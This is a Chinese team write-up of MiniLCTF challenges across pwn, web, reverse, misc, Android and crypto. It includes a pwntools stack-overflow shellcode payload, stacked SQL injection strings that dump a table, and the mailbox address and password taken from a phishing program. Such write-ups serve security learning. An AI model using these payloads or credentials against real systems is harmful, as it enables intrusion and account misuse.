---
team: Int3rn3t_Expl0rer
members:
    - Reverier
    - luoqi@n
    - arttnba3
---

## `pwn`

### hello | Author: arttnba3

> 证明了我真的是菜鸡的一道`pwn`题，搞了半天才明白XD

做题环境```Manjaro-KDE```

首先使用```checksec```指令查看保护，可以发现保护基本都是关的，只有```Partial RELRO```，那么基本上是可以为所欲为了wwww

```win```环境下拖进```IDA```进行分析

![image.png](https://i.loli.net/2020/05/11/f4qnCg65NPxT2D9.png)

可以发现在```vul函数```存在明显的栈溢出

![image.png](https://i.loli.net/2020/05/11/67tk1FiacXVR8ou.png)

```main```函数中调用了```vul```

![image.png](https://i.loli.net/2020/05/11/nKAZp7wUtfV3g6P.png)

那么程序漏洞很明显了：

- **使用```fgets```读入最大为72个字节的字符串，但是只分配给了48字节的空间，存在栈溢出**

又有一个可疑的```bd```函数，那么第一时间想到**```ret2text```**——构造`payload`跳转到```bd```

但是很明显，```bd```函数基本是是空的(悲)

![image.png](https://i.loli.net/2020/05/11/59MVFNoviEYp4rn.png)

> 然后我就在这里卡了半天，证明我真的菜XD

那么我们该如何利用这个```bd```呢？

可以看到在```bd```中存在操作```jmp rsp```，那么其实我们可以利用这个指令**跳转回栈上，执行我们放在栈上的`shellcode`**

**也就是说这其实是一道`ret2shellcode`的题**

#### `ret2text`执行过程：

- **`rsp`永远指向栈顶**

- **当我们用常规的`ret2text`构造48字节字符串`+8`字节`rbp+8`字节`bd`函数地址（覆盖掉原返回地址）的`payload`时，`rsp`指向的其实是`bd`函数地址的位置**

- **`ret`指令进入`bd`后弹出`bd`地址，`rsp`指向栈内储存的`rbp`的值（预期内）**

- **`bd`函数将`rbp`再`push`入栈中，此时`rsp`再加8，指向被新压入的`rbp`（预期内）**

- **`bd`函数执行`rsp`上的指令**
那么我们就可以在`rsp`预期内指向的地址上覆盖上我们的`shellcode`使其被执行



接下来就是`ret2shellcode`的：
#### `ret2shellcode`修正过程：
- **在`rsp`最终指向的地址放上我们待执行的`shellcode`**

- **由于长度不够，我们可以把`getshell`的`shellcode`放在读入的字符串的最开始的地方，再通过汇编指令进行跳转**
- **在`rsp`所指向的位置覆盖上`shellcode`，改变`rsp`的值使其指向`getshell`的`shellcode`并再次进行跳转，完成`getshell`**

那么`payload`就很容易构造出来了：

```python

context.arch = 'amd64'
sc1 = asm(shellcraft.sh())
sc2 = asm('sub rsp,64')//48字节的字符串+8字节的rsp+8字节的rbp，跳回开头
sc3 = asm('jmp rsp')
elf = ELF('hello')
payload = sc1 + b'a'*(56-len(sc1)) + p64(elf.symbols['bd']) + sc2 + sc3
```

![image.png](https://i.loli.net/2020/05/11/DCm7Wv6HMOnVLja.png)

## Web

### id_wife | Author: luoqi@n

<img src="https://i.loli.net/2020/05/16/gYQKdLw645feHW3.png" alt="image-20200516102439823.png" style="zoom:50%;" />

这个还真挺好玩的，把认识的师傅id都输了一遍，直到我把自己的id输了进去（草

这里拿小sad举例：

![image-20200516105810838.png](https://i.loli.net/2020/05/16/EtImALgT82Oeznq.png)

看见这个，我立刻想到了强网杯的随便注（其实找了半天），因为那道题用到了堆叠注入的知识点，所以我就试了一下

```
sad'); show databases;
```

![image-20200516110446026.png](https://i.loli.net/2020/05/16/YUsGpLbv8QtgiNR.png)

成了，再试一下查询表

```
sad'); show tables;
```

![image-20200516110244132.png](https://i.loli.net/2020/05/16/N7hIaBu3ymOJ5E8.png)

这个看起来这么臭的表一定有问题（确信

这里我用到了handler，这条语句使我们能够一行一行的浏览一个表中的数据，所以：

```
sad');handler`1145141919810`open;handler`1145141919810`read first;
```

好的给了个假flag...再读取下一条

```
sad');handler`1145141919810`open;handler`1145141919810`read first;handler`1145141919810`read next;
```

直接给出flag（因为是动态flag所以不贴了

## Reverse

### easy-re | Author: Reverier

本题就是一个很常规的逆向, 不过F5之后不太好康而已.

F5出来的源码:

```C >folded
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __m128i v3; // xmm1
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __m128i v6; // xmm0
  __int64 v7; // rdx
  signed __int64 v8; // rax
  __int128 v10; // [rsp+20h] [rbp-1B8h]
  __int128 v11; // [rsp+30h] [rbp-1A8h]
  __int128 v12; // [rsp+40h] [rbp-198h]
  __int128 v13; // [rsp+50h] [rbp-188h]
  __int128 v14; // [rsp+60h] [rbp-178h]
  __int128 v15; // [rsp+70h] [rbp-168h]
  char Str[16]; // [rsp+80h] [rbp-158h]
  char v17[16]; // [rsp+90h] [rbp-148h]
  __int16 v18; // [rsp+A0h] [rbp-138h]
  char v19; // [rsp+A2h] [rbp-136h]
  __int128 v20; // [rsp+A3h] [rbp-135h]
  __int64 v21; // [rsp+B3h] [rbp-125h]
  int v22; // [rsp+BBh] [rbp-11Dh]
  char v23; // [rsp+BFh] [rbp-119h]
  char v24[256]; // [rsp+C0h] [rbp-118h]

  v3 = _mm_load_si128((const __m128i *)&unk_140003440);
  _mm_store_si128((__m128i *)&v10, _mm_load_si128((const __m128i *)&xmmword_140003400));
  _mm_store_si128((__m128i *)&v12, _mm_load_si128((const __m128i *)&xmmword_1400033E0));
  v4 = _mm_load_si128((const __m128i *)&dword_140003410);
  _mm_store_si128((__m128i *)&v11, v3);
  v5 = _mm_load_si128((const __m128i *)&xmmword_1400033F0);
  _mm_store_si128((__m128i *)&v14, v4);
  v6 = _mm_load_si128((const __m128i *)&unk_140003430);
  _mm_store_si128((__m128i *)&v13, v5);
  _mm_store_si128((__m128i *)Str, v6);
  v15 = 0i64;
  v18 = 26727;
  v20 = 0i64;
  v19 = 116;
  _mm_store_si128((__m128i *)v17, _mm_load_si128((const __m128i *)&unk_140003420));
  v21 = 0i64;
  v22 = 0;
  v23 = 0;
  puts(Str);
  cin_read(std::cin, v7, v24);
  v8 = 0i64;
  do
  {
    if ( v24[v8] != *((_DWORD *)&v10 + v8) + 100 )
    {
      puts(&v17[8]);
      exit(1);
    }
    ++v8;
  }
  while ( v8 < 20 );
  return puts(&v17[14]);
}
```

程序将输入和`v10`处的数据`+100`后进行比对.

相关数据:

```C >folded
xmmword_1400033E0 xmmword 10000000E000000150000000Fh
.rdata:00000001400033E0                                             ; DATA XREF: main+39↑r
.rdata:00000001400033F0     xmmword_1400033F0 xmmword 1FFFFFFFB0000000FFFFFFFC3h
.rdata:00000001400033F0                                             ; DATA XREF: main+55↑r
.rdata:0000000140003400     xmmword_140003400 xmmword 50000000A0000000500000009h
.rdata:0000000140003400                                             ; DATA XREF: main+19↑r
.rdata:0000000140003410     dword_140003410 dd 0FFFFFFFDh           ; DATA XREF: main+47↑r
.rdata:0000000140003414                     db  0Fh
.rdata:0000000140003415                     db    0
.rdata:0000000140003416                     db    0
.rdata:0000000140003417                     db    0
.rdata:0000000140003418                     db  15h
.rdata:0000000140003419                     db    0
.rdata:000000014000341A                     db    0
.rdata:000000014000341B                     db    0
.rdata:000000014000341C                     db  19h
.rdata:000000014000341D                     db    0
.rdata:000000014000341E                     db    0
.rdata:000000014000341F                     db    0
.rdata:0000000140003420     unk_140003420   db  72h ; r             ; DATA XREF: main+8F↑r
.rdata:0000000140003421                     db  20h
.rdata:0000000140003422                     db  66h ; f
.rdata:0000000140003423                     db  6Ch ; l
.rdata:0000000140003424                     db  61h ; a
.rdata:0000000140003425                     db  67h ; g
.rdata:0000000140003426                     db  3Ah ; :
.rdata:0000000140003427                     db    0
.rdata:0000000140003428                     db  77h ; w
.rdata:0000000140003429                     db  72h ; r
.rdata:000000014000342A                     db  6Fh ; o
.rdata:000000014000342B                     db  6Eh ; n
.rdata:000000014000342C                     db  67h ; g
.rdata:000000014000342D                     db    0
.rdata:000000014000342E                     db  52h ; R
.rdata:000000014000342F                     db  69h ; i
.rdata:0000000140003430     unk_140003430   db  50h ; P             ; DATA XREF: main+63↑r
.rdata:0000000140003431                     db  6Ch ; l
.rdata:0000000140003432                     db  65h ; e
.rdata:0000000140003433                     db  61h ; a
.rdata:0000000140003434                     db  73h ; s
.rdata:0000000140003435                     db  65h ; e
.rdata:0000000140003436                     db  20h
.rdata:0000000140003437                     db  69h ; i
.rdata:0000000140003438                     db  6Eh ; n
.rdata:0000000140003439                     db  70h ; p
.rdata:000000014000343A                     db  75h ; u
.rdata:000000014000343B                     db  74h ; t
.rdata:000000014000343C                     db  20h
.rdata:000000014000343D                     db  79h ; y
.rdata:000000014000343E                     db  6Fh ; o
.rdata:000000014000343F                     db  75h ; u
.rdata:0000000140003440     unk_140003440   db    8                 ; DATA XREF: main+29↑r
.rdata:0000000140003441                     db    0
.rdata:0000000140003442                     db    0
.rdata:0000000140003443                     db    0
.rdata:0000000140003444                     db  17h
.rdata:0000000140003445                     db    0
.rdata:0000000140003446                     db    0
.rdata:0000000140003447                     db    0
.rdata:0000000140003448                     db    1
.rdata:0000000140003449                     db    0
.rdata:000000014000344A                     db    0
.rdata:000000014000344B                     db    0
.rdata:000000014000344C                     db 0FDh
.rdata:000000014000344D                     db 0FFh
.rdata:000000014000344E                     db 0FFh
.rdata:000000014000344F                     db 0FFh
```

简单的把数据都复制出来, 输出一下:

```C
#include <stdio.h>
char test[] = {9, 5, 0xA, 5, 0xFD, 0xF, 0x15, 0x19, 0xf, 0x15, 0xe, 0x1, 0xc3,0xf,0xfb, 0x1};

int main() {
  for (int i = 0; i < 16; i++) {
    printf("%c", test[i] + 0x64);
  }
}
// minil{easyre's_easy}
```

这个程序的输出顺序有些乱, 自己拼接一下就好了.

### machine | Author: Reverier

我对着题目给出的四串乱七八糟的东西发了两天的呆 最后没办法了去问Frank才发现这道题竟然是要F12康脚本...

F12之后拿到脚本, 尝试JS反混淆等皆不成功, 直接分析怎么看也不可能, 于是动态调试, 把题目的脚本中`return`语句全打上断点, 一步一步调试就能看见`flag`了.

![solved.png](https://i.loli.net/2020/05/16/Qy7ETH2qhjnNVpI.png)

### What's Virtialization | Author: Reverier

这道题表面上看着是虚拟化, 实际上没发现和虚拟化有什么关系emmmm...

F5之后分析的`main`函数:

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int global_iter; // [esp+D0h] [ebp-2Ch]
  signed int i; // [esp+DCh] [ebp-20h]
  signed int j; // [esp+DCh] [ebp-20h]
  signed int k; // [esp+DCh] [ebp-20h]
  signed int v11; // [esp+E8h] [ebp-14h]
  int input_length; // [esp+F4h] [ebp-8h]

  printf("Welcome to MiniLCTF!\n");
  printf("Plz input your flag:");
  scanf_s("%s", input, 100);
  input_length = strlen(input);
  v11 = 100;                                    // fibnacci[9]: [1, 1, 2, 3, 5, 8, 13, 21 ,34]
  if ( fibnacci[0] * fibnacci[0] + input_length * input_length >= fibnacci[0] * input_length * fibnacci[2]
    && or(input_length, fibnacci[1]) == fibnacci[8] - fibnacci[0] )// if input_length == 32 or input_length == 33
  {
    global_iter = 0;
    for ( i = 0; i < 6; ++i )
    {
      first_proc[i] = xor(input[i], const_array1[global_iter]);
      global_iter = (fibnacci[0] + global_iter) % (fibnacci[4] + fibnacci[1]);// just iter++
                                                // when iter > 5, iter = 0
      if ( and(first_proc[i], const_array2[i]) != first_proc[i] )
      {
        v3 = xor(fibnacci[3] / 3, fibnacci[0]); // v3 = 0
        v11 = and(v11, v3);                     // v11 = 0
      }
    }                                           // just reconize is minil{ or not
    if ( or(v11, fibnacci[8]) != fibnacci[6] + fibnacci[7] )// False when v11 in [0, 2, 32, 34]
    {
      for ( j = 0; j < 13; ++j )
      {
        byte_4060F6[j] = xor(zero_array[j], const_array1[global_iter]);
        global_iter = (fibnacci[1] + global_iter) % (fibnacci[3] * fibnacci[2]);
        if ( and(byte_4060F6[j], const_array3[j]) != byte_4060F6[j] )
        {
          v4 = xor(fibnacci[5] / 2 - 3, fibnacci[1]);
          v11 = and(v11, v4);
        }
      }
      if ( or(v11, fibnacci[7]) != fibnacci[5] + fibnacci[6] )
      {
        for ( k = 0; k < 13; ++k )
        {
          byte_406103[k] = xor(byte_40609B[k], const_array1[global_iter]);
          global_iter = (global_iter + fibnacci[2] / 2) % (fibnacci[5] - fibnacci[2]);
          if ( and(byte_406103[k], const_array4[k]) != byte_406103[k] )
          {
            v5 = xor(fibnacci[7] / 7, fibnacci[3]);
            v11 = and(v11, v5);
          }
        }
        if ( and_utils(v11) != v11 - fibnacci[0] )
        {
          printf("\nCongratulations! Your flag is right!");
          getchar();
        }
      }
    }
  }
  getchar();
  return 0;
}
```

其中`xor`, `or`和`and`涉及到一点模电的知识, 很好识别.

常量数组带入后再次简化的程序:

```C
#include <stdio.h>
#include <string.h>
int or_utils(int a, int b) { return ~a & ~b; }

int and (int a, int b) {
    int v1, v2;
    v1 = or_utils(a, a);
    v2 = or_utils(b, b);
    return or_utils(v1, v2);
}

int or (int a, int b) {
    int v1, v2;
    v1 = or_utils(a, b);
    v2 = or_utils(a, b);
    return or_utils(v1, v2);
}

int and_utils(int a1) { return or_utils(a1, a1); }

int xor(int a, int b) {
        int v2;  // ST08_4
        int v3;  // eax
        v2 = or_utils(a, b);
        v3 = and(a, b);
        return or_utils(v3, v2);
    }

int fibnacci[9] = {1, 1, 2, 3, 5, 8, 13, 21, 34};

int main() {
    int v3;
    int v4;
    int v5;
    int global_iter;
    signed int i;
    signed int j;
    signed int k;
    signed int is_ok;
    int input_length;
    char input[105];
    char first_proc[7] = {};
    char arr_020408[7] = "020408";
    char const_array2[7] = "}[^]}{";
    char const_array3[14] = "dtKcXxDmYgoNY";
    char const_array4[14] = "@D]pTYHp@Yw^O";
    char second_proc[14] = {};
    char third_proc[86] = {};

    printf("Welcome to MiniLCTF!\n");
    printf("Plz input your flag:");
    scanf("%s", input);
    input_length = strlen(input);
    is_ok = 100;  // fibnacci[9]: [1, 1, 2, 3, 5, 8, 13, 21 ,34]
    global_iter = 0;
    if (input_length == 32 || input_length == 33) {
        for (i = 0; i < 6; ++i) {
            first_proc[i] = input[i] ^ arr_020408[global_iter];
            global_iter++;  // just iter++
            if (global_iter > 5) global_iter = 0;
            // when iter > 5, iter = 0
            if (and(first_proc[i], const_array2[i]) != first_proc[i]) {
                v3 = 0;   // v3 = 0
                is_ok = 0;  // is_ok = 0
            }
        }
        if (is_ok)
        {   //global_iter = 0 now.
            for (j = 0; j < 13; ++j) {
                second_proc[j] = arr_020408[global_iter];
                global_iter = (1 + global_iter) % 5;
                //global_iter is in [0, 1, 2, 3, 4, 5]
                if (and(second_proc[j], const_array3[j]) != second_proc[j]) {
                    v4 = 0;
                    is_ok = 0;
                }
            }
            if (is_ok) {
                for (k = 0; k < 13; ++k) {
                    third_proc[k] = arr_020408[global_iter];
                    global_iter = (global_iter + 1) % 5;
                    if (and(third_proc[k], const_array4[k]) != third_proc[k]) {
                        v5 = 0;
                        is_ok = 0;
                    }
                }
                if (is_ok) {
                    printf("\nCongratulations! Your flag is right!");
                    getchar();
                }
            }
        }
    }
    getchar();
    return 0;
}
```

这个程序和题目的作用相同.

稍微改一下, 编写解题程序:

```C
#include <stdio.h>
#include <string.h>

int main() {
    int v3;
    int v4;
    int v5;
    int global_iter;
    signed int i;
    signed int j;
    signed int k;
    signed int is_ok;
    int input_length;
    char input[105] = {};
    char first_proc[7] = {};
    char arr_020408[7] = "020408";
    char const_array2[7] = "}[^]}{";
    char const_array3[14] = "dtKcXxDmYgoNY";
    char const_array4[14] = "@D]pTYHp@Yw^O";
    char second_proc[14] = {};
    char zero_array[14] = {};
    char zero_array1[86] = {};
    char third_proc[86] = {};
    input_length = strlen(input);
    is_ok = 100;
    global_iter = 0;
    for (i = 0; i < 6; ++i) {
        input[i] = const_array2[i] ^ arr_020408[global_iter];
        global_iter++;
        if (global_iter > 5) global_iter = 0;
    }
    for (j = 0; j < 13; ++j) {
        second_proc[j] = const_array3[j] ^ arr_020408[global_iter];
        global_iter = (1 + global_iter) % 6;
        input[j+6] = second_proc[j];
    }
    for (k = 0; k < 13; ++k) {
        third_proc[k] = const_array4[k] ^ arr_020408[global_iter];
        global_iter = (global_iter + 1) % 6;
        input[k + 19] = third_proc[k];
    }
    printf("flag is: %s", input);
    getchar();
    return 0;
}
//flag is: MiniMCTF{Wh@t_iS_virti@liz@tiOn}
```

复制下来改改就好了.

最后的输出中`MiniL`变成了`MiniM`, 手动改过来就是正确`flag`了.

### EPL-Fish | Author: luoqi@n, Reverier

这道题还不如放到`misc`里去...一点逆向都没用到

下载文件发现这玩意是用来钓鱼的假`QQ`登陆界面，于是随便输入账号密码试了一下

<img src="https://i.loli.net/2020/05/16/p6mYFk734DCjtqM.png" alt="image-20200516111101915.png" style="zoom:67%;" />

草这钓鱼界面太真实了，用`wireshark`抓包试试看

![image-20200516144727912.png](https://i.loli.net/2020/05/16/ziCEpyPBwZrRtLV.png)

可以看到这个程序用`smtp`协议登录邮箱，将用户输入的账号和密码发送到dengluwo233@163.com这个邮箱。由于`smtp`协议登录时的账号和密码默认为`base64`编码加密，所以我们很容易得到邮箱密码：`FGYYJTMAZVTUPSWH`

但是邮箱的账号和密码在网页登录的时候显示密码错误，163邮箱的密码也默认必须由数字字母组成，这个密码明显不符合，但是后来RX大哥用客户端登录成功了，于是问了下出题人，这里贴一下：

![image-20200516145508231.png](https://i.loli.net/2020/05/16/7ONTUZcbegP4YaQ.png)

登录成功后，在收件箱发现一个压缩包：`thing.zip`，打开之后在其中的`QQ.e`文件里发现`flag`

![image-20200516145719636.png](https://i.loli.net/2020/05/16/Q6DX4Pj2zlTh7qc.png)

```
miniL{Epl_Oh_gre@T}
```

## Misc

### MiniGameHacking | Author: luoqi@n

这游戏好玩得很（虽然为了抢一血解法非常暴力

![image-20200516152750684.png](https://i.loli.net/2020/05/16/EqNiWxgfOcYpFTu.png)

在data.unity3d文件里人 肉 搜 索到的flag（因为flag的minil少了一个m，搜索minil是搜不到的

![image-20200516153027924.png](https://i.loli.net/2020/05/16/hO81TYAlNsPQEjW.png)

```
minil{diosamasayikou}
```

后来听别人说游戏通关也有flag，一共15关，我打到14关就过不去了只能放弃（

### minecraft-2 | Author: Reverier

登陆服务器的时候开着`wireshark`, 抓包抓到`flag2`的子服务器地址, 然后改名`Ruby`, 直连`flag2`服务器获取`flag`.

### EasyVmem | Author: luoqi@n, Reverier

2G的vmem文件...我要死了草...

本着这么大的文件不可能拖到kali里用Volatility挨个找的想法，我跟ga1@xy嫖了一个windows用的取证工具：Magnet  AXIOM，加载了半个多小时之后终于成了

![image-20200516153735514.png](https://i.loli.net/2020/05/16/w1s3rvdboC5W2xz.png)

然后在剪贴板里看到了一个假flag和奇怪的东西

![image-20200516154011641.png](https://i.loli.net/2020/05/16/PScZYnO5XB4e1Kq.png)

假flag里（base64）的大致内容是grep cha113nge to start the game，至于下面那一堆s3cR3t（太多了就不放这了）后面的数字一直在变，从10 10一直到289 289，猜测是289x289像素的图片，于是让RX大哥画了个图：

<img src="https://i.loli.net/2020/05/16/xrSw36YFG9ovIMb.png" alt="image-20200516154328639.png" style="zoom:67%;" />

扫一下就可以获得flag（出题人说他是在volatility环境下设置的题，所以我这算是抄近路了

```
miniLCTF{mAst3R_0F_v0Lat1l1tY!}
```

绘图脚本:

```python
__AUTHOR__ = 'Reverier'
from PyQt5 import QtGui, QtWidgets, QtCore
from PyQt5.QtGui import *
from PyQt5.QtCore import *
from PyQt5.QtWidgets import *

import sys

class DrawWidget(QtWidgets.QWidget):
    def __init__(self, parent=None):
        super().__init__(parent=parent)
        self.setStyleSheet('background-color: #ffffff;')

    def drawPoints(self, qp):
        qp.setPen(QPen(Qt.black, 2))
        with open('./inp.txt', 'r') as inp:
            data = inp.read().split('s3cR3t:')
            print(data)
            for i in data:
                try:
                    x = int(i.split(' ')[0])
                    y = int(i.split(' ')[1])
                    qp.drawPoint(x, y)
                except:
                    pass

    def paintEvent(self, QPaintEvent):
        qp = QPainter()
        qp.begin(self)
        self.drawPoints(qp)
        qp.end()

if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    window = DrawWidget()
    window.show()
    window.resize(300, 300)
    app.exec_()

```

### MITM_0 | Author: luoqi@n

![image-20200516155619666.png](https://i.loli.net/2020/05/16/2LCPozEFjNe7cWl.png)

这是一个中间人攻击的流量包

![image-20200516155537795.png](https://i.loli.net/2020/05/16/WfOx9aRqEpmQnzP.png)

这里把192.168.1.152这个ip base64一下交上去就可以了

### MITM_1 | Author: luoqi@n

![image-20200516155849753.png](https://i.loli.net/2020/05/16/TxbsAJVKdO5eCtI.png)

去查一下common name：

![image-20200516160029095.png](https://i.loli.net/2020/05/16/RhzIQCWavnkOAXN.png)

一看这个东西就是跟证书有关的，于是在流量包里搜索certificate

![image-20200516160603633.png](https://i.loli.net/2020/05/16/I3aP84wl5RAhCio.png)

issuer，commonname，那这个Liuyukun CA应该就是要找的东西了，base64一下就能得到flag

## 安卓

### TestOnly | Author: Reverier

用`dex2jar`导出为jar之后拖入到`jd-gui`, 发现就是个简单的算法题. 不过查了好久也没查到`Java`中的`SHA`代指SHA几, 最后索性直接复制下来跑出答案.

```java
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;

public class test {
    public static int a(char paramChar) {
        int i;
        if (paramChar < '') {
            i = paramChar;
        } else {
            i = a(Character.toString(paramChar));
        }
        return i;
    }

    public static int a(String paramString) {
        int i = paramString.length();
        int j = 0;
        if (i > 0)
            j = paramString.getBytes(StandardCharsets.UTF_8)[0] & 0xFF;
        return j;
    }

    public static String b(String paramString) {
        try {
            MessageDigest messageDigest = MessageDigest.getInstance("SHA");
            byte[] arrayOfByte = messageDigest.digest(paramString.getBytes("UTF-8"));
            StringBuffer stringBuffer = new StringBuffer();
            for (byte b = 0; b < arrayOfByte.length; b++) {
                int i = arrayOfByte[b] & 0xFF;
                if (i < 16)
                    stringBuffer.append("0");
                stringBuffer.append(Integer.toHexString(i));
            }
            return stringBuffer.toString();
        } catch (Exception exception) {
            System.out.println(exception.toString());
            exception.printStackTrace();
            return "";
        }
    }

    public static String J() {
        String str = "";
        try {
            String str1 = b(
                    "B08020D0FACFDAF81DB46890E4040EDBB8613DA5ABF038F8B86BD44525D2E27B26E22ACD06388112D8467FD688C79CC7EA83F27440577350E8168C2560368616");
            str = str1;
        } catch (Exception exception) {
            exception.printStackTrace();
        }
        char[] arrayOfChar = new char[30];
        arrayOfChar[0] = 'U';
        arrayOfChar[1] = '_';
        arrayOfChar[2] = '\005';
        arrayOfChar[3] = 'S';
        arrayOfChar[4] = 'K';
        arrayOfChar[5] = '`';
        arrayOfChar[6] = '^';
        arrayOfChar[7] = Character.MIN_VALUE;
        arrayOfChar[8] = '\021';
        arrayOfChar[9] = '=';
        arrayOfChar[10] = 'f';
        arrayOfChar[11] = 'W';
        arrayOfChar[12] = 'P';
        arrayOfChar[13] = '{';
        arrayOfChar[14] = '\004';
        arrayOfChar[15] = 'i';
        arrayOfChar[16] = 'U';
        arrayOfChar[17] = 'S';
        arrayOfChar[18] = 'e';
        arrayOfChar[19] = 'm';
        arrayOfChar[20] = '7';
        arrayOfChar[21] = 'U';
        arrayOfChar[22] = '\027';
        arrayOfChar[23] = '0';
        arrayOfChar[24] = 'j';
        arrayOfChar[25] = '\001';
        arrayOfChar[26] = '(';
        arrayOfChar[27] = '\007';
        arrayOfChar[28] = 'a';
        arrayOfChar[29] = '\037';
        for (byte b = 0; b < arrayOfChar.length; b++)
            arrayOfChar[b] = (char) (char) (arrayOfChar[b] ^ a(str.charAt(b)));
        return String.copyValueOf(arrayOfChar).replace("flag", "minil");
    }

    public static void main(String[] args) {
        System.out.println(J());
    }
}
```

## Crypto

### ιIl | Author: Reverier, luoqi@n

从网上找到一个轮子, 稍加修改使用`sage`跑一下:

```python
# sage

h = 31497596336552470100084187834926304075869321337353584228754801815485197854209104578876574798202880445492465226847681886628987815101276129299179423009194336979092146458547058477361338454307308727787100367492619524471399054846173175096003547542362283035506046981301967777510149938655352986115892410982908002343
p = 126982824744410328945797087760338772632266265605499464155168564006938381164343998332297867219509875837758518332737386292044402913405044815273140449332476472286262639891581209911570020757347401235079120185293696746139599783586620242086604902725583996821566303642800016358224555557587702599076109172899781757727
c = 81425203325802096867547935279460713507554656326547202848965764201702208123530941439525435560101593619326780304160780819803407105746324025686271927329740552019112604285594877520543558401049557343346169993751022158349472011774064975266164948244263318723437203684336095564838792724505516573209588002889586264735

v1 = vector(ZZ, [1, h])
v2 = vector(ZZ, [0, p])
m = matrix([[1, h], [0, p]])
shortest_vector = m.LLL()[0]
f, g = shortest_vector
print(f, g)
f = abs(f)
g = abs(g)

a = f*c % p % g
m = a * inverse_mod(f, g) % g
print(m)
```

![Screenshot_20200516_151456](https://i.loli.net/2020/05/16/3LrD1efsYIm8la7.png)

最终`flag`: `minil{l1Ii5n0tea5y}`

### f**k&base | Author: Reverier

这道题就是上面那道的变种. 用`brainfuck`解密一下`source.txt`:

```sage
from Crypto.Util.number import *
q=getPrime(1024)
f=getPrime(511)
g=getPrime(511)
while g<pow(q/4,0.5) and g>pow(q/2,0.5):
	g=getPrime(511)
f_inv_q=inverse(f,q)
h=f_inv_q*g%q
m=bytes_to_long(b'flag')#flag is base**(flag)
r=getPrime(510)
e=(r*h+m)%q
print f
print g
print q
print e
```

解密脚本:

```python
# sage

p = 172620634756442326936446284386446310176482010539257694929884002472846127607264743380697653537447369089693337723649017402105400257863085638725058903969478143249108126132543502414741890867122949021941524916405444824353100158506448429871964258931750339247018885114052623963451658829116065142400435131369957050799
c = 130055004464808383851466991915980644718382040848563991873041960765504627910537316320531719771695727709826775790697704799143461018934672453482988811575574961674813001940313918329737944758875566038617074550624823884742484696611063406222986507537981571075140436761436815079809518206635499600341038593553079293254

f = 4685394431238242086047454699939574117865082734421802876855769683954689809016908045500281898911462887906190042764753834184270447603004244910544167081517863
g = 5326402554595682620065287001809742915798424911036766723537742672943459577709829465021452623299712724999868094408519004699993233519540500859134358256211397

a = f*c % p % g
m = a * inverse_mod(f, g) % g
print(m)
# m = 629250774757584627131327668302148468
```

![Screenshot_20200516_152308](https://i.loli.net/2020/05/16/IYO1iCHWFoQqVy3.png)
